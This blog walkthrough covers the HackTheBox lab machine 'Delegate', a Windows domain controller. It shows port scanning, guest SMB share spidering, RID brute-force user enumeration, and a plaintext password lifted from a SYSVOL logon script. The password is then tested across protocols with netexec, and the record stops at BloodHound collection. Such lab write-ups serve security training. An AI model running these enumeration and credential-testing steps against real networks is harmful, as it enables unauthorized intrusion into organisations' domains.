---
title: Delegate
date: 2026-04-26
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Port53-DNS-Discovery-Host
  - Port139-135-SMB-anonymous-login
  - Port139-135-SMB-enumerating
  - Lateral-Movement-account-verify-nxc
  - Bloodhound-Collect-nxc
  - Bloodhound-vectory-GenericWrite
  - Windows-Privilege-SeEnableDelegationPrivilege
lastmod: 2026-05-07T06:21:22.641Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Delegate" >}}

***

# Recon

### PORT & IP SCAN

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.69 -oN serviceScan.txt
[sudo] password for parallels: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 15:37 +0800
Nmap scan report for 10.129.234.69
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-26 07:37:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-04-25T07:10:25
|_Not valid after:  2026-10-25T07:10:25
|_ssl-date: 2026-04-26T07:39:29+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-26T07:38:50+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49172/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
53752/tcp open  msrpc         Microsoft Windows RPC
56339/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56340/tcp open  msrpc         Microsoft Windows RPC
56344/tcp open  msrpc         Microsoft Windows RPC
63285/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-26T07:38:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.54 seconds

```

### Port 53 DNS

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}} The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `delegate.vl`, and the hostname is `DC1`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc smb 10.129.234.69  --generate-hosts-file  hosts
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
                                                               
```

{{< code >}}\
127.0.0.1       localhost\
127.0.1.1       kali-linux-2025-2.localdomain   kali-linux-2025-2\
10.129.234.69     DC1.delegate.vl delegate.vl DC1

# The following lines are desirable for IPv6 capable hosts

::1     localhost ip6-localhost ip6-loopback\
ff02::1 ip6-allnodes\
ff02::2 ip6-allrouters\
{{< /code >}}

### SMB

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-anonymous-login" >}} The guest authentication is not enough to list users just by asking for users, but I am able to do a RID cycle (bruteforce) attack:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nxc smb 10.129.234.69   -u 'guest' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-enumerating-spider " >}} Using the --spider model of netexec to quickly view all file

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb 10.129.234.69    -u 'guest' -p ''   --spider 'IPC$' --regex .
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              [*] Spidering .
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/InitShutdown [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/lsass [lastm:'1601-01-01 07:36' size:4]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/ntsvcs [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/scerpc [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-2b4-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-3a4-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/epmapper [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-218-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/LSM_API_service [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-3e4-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/eventlog [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-4e4-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/TermSrv_API_service [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Ctx_WinStation_API_service [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/atsvc [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-2b4-1 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-684-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/wkssvc [lastm:'1601-01-01 07:36' size:4]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/SessEnvPublicRpc [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-8bc-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/RpcProxy\56339 [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/e3716e93a0fa3bb4 [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/RpcProxy\593 [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/srvsvc [lastm:'1601-01-01 07:36' size:4]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/spoolss [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-bc0-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/netdfs [lastm:'1601-01-01 07:36' size:3]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/vgauth-service [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-2a0-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-ac4-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/Winsock2\CatalogChangeListener-9f0-0 [lastm:'1601-01-01 07:36' size:1]
SMB         10.129.234.69   445    DC1              //10.129.234.69/IPC$/W32TIME_ALT [lastm:'1601-01-01 07:36' size:4]
                                                                                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb 10.129.234.69    -u 'guest' -p ''   --spider 'NETLOGON' --regex .
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              [*] Spidering .
SMB         10.129.234.69   445    DC1              //10.129.234.69/NETLOGON/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/NETLOGON/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/NETLOGON/users.bat [lastm:'2023-10-01 17:08' size:159]
                                                                                                                                                                                                                                           
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb 10.129.234.69    -u 'guest' -p ''   --spider 'SYSVOL' --regex .
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              [*] Spidering .
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/DfsrPrivate [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/scripts [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9} [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9} [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI [lastm:'2023-10-01 17:08' size:22]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol [lastm:'2023-10-01 17:08' size:2792]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2023-10-01 17:08' size:1098]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI [lastm:'2023-10-01 17:08' size:22]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf [lastm:'2023-10-01 17:08' size:3956]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/scripts/. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/scripts/.. [dir]
SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/delegate.vl/scripts/users.bat [lastm:'2023-10-01 17:08' size:159]
                                                                                                                                                          
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  netexec smb 10.129.234.69    -u 'guest' -p '' --rid-brute  
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
SMB         10.129.234.69   445    DC1              498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              500: DELEGATE\Administrator (SidTypeUser)
SMB         10.129.234.69   445    DC1              501: DELEGATE\Guest (SidTypeUser)
SMB         10.129.234.69   445    DC1              502: DELEGATE\krbtgt (SidTypeUser)
SMB         10.129.234.69   445    DC1              512: DELEGATE\Domain Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              513: DELEGATE\Domain Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              514: DELEGATE\Domain Guests (SidTypeGroup)
SMB         10.129.234.69   445    DC1              515: DELEGATE\Domain Computers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              516: DELEGATE\Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              517: DELEGATE\Cert Publishers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              518: DELEGATE\Schema Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              519: DELEGATE\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.69   445    DC1              521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              525: DELEGATE\Protected Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              526: DELEGATE\Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.69   445    DC1              572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.69   445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)
SMB         10.129.234.69   445    DC1              1101: DELEGATE\DnsAdmins (SidTypeAlias)
SMB         10.129.234.69   445    DC1              1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.69   445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)
SMB         10.129.234.69   445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)
SMB         10.129.234.69   445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)
SMB         10.129.234.69   445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)
SMB         10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)
SMB         10.129.234.69   445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)

```

It’s always worth checking `NETLOGON` and `SYSVOL`. These two shares can have scripts or other policies that may leak credentials. In this case, there’s a script on `SYSVOL`:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ smbclient -N //dc1.delegate.vl/SYSVOL
Try "help" to get a list of possible commands.
smb: \> get /scripts/users.bat
NT_STATUS_OBJECT_PATH_NOT_FOUND opening remote file \scripts\users.bat
smb: \> ls
  .                                   D        0  Sat Sep  9 21:52:30 2023
  ..                                  D        0  Sat Aug 26 17:39:25 2023
  delegate.vl                        Dr        0  Sat Aug 26 17:39:25 2023

                4652287 blocks of size 4096. 1163095 blocks available
smb: \> cd delegate.vl\
smb: \delegate.vl\> ls
  .                                   D        0  Sat Aug 26 17:45:45 2023
  ..                                  D        0  Sat Aug 26 17:39:25 2023
  DfsrPrivate                      DHSr        0  Sat Aug 26 17:45:45 2023
  Policies                            D        0  Sat Aug 26 17:39:30 2023
  scripts                             D        0  Sat Aug 26 20:45:24 2023

                4652287 blocks of size 4096. 1163094 blocks available

smb: \delegate.vl\> cd scripts\
lssmb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 20:45:24 2023
  ..                                  D        0  Sat Aug 26 17:45:45 2023
  users.bat                           A      159  Sat Aug 26 20:54:29 2023

                4652287 blocks of size 4096. 1163094 blocks available
smb: \delegate.vl\scripts\> get users.bat 
getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \delegate.vl\scripts\> 

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat users.bat 
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123      
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-account-verify-nxc" >}} if no pwd! mean that It doesn’t work over WinRM or RDP (the plus means the creds are good, but lack of `pwned!` means permissions to RDP are not there):(Why)。

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto dc1.delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123'; done

[*] Testing smb...
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 

[*] Testing winrm...
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.69   5985   DC1              [-] delegate.vl\A.Briggs:P4ssw0rd1#123

[*] Testing wmi...
RPC         10.129.234.69   135    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
RPC         10.129.234.69   135    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 

[*] Testing rdp...
RDP         10.129.234.69   3389   DC1              [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC1) (domain:delegate.vl) (nla:True)
RDP         10.129.234.69   3389   DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 

[*] Testing ssh...

[*] Testing ldap...
LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
                                                                                                                                                                            
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Bloodhound-Collect-nxc" >}} I’ll use auth as A.Briggs to collect BloodHound data. I like to collect with both `netexec`:

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec ldap dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.234.69
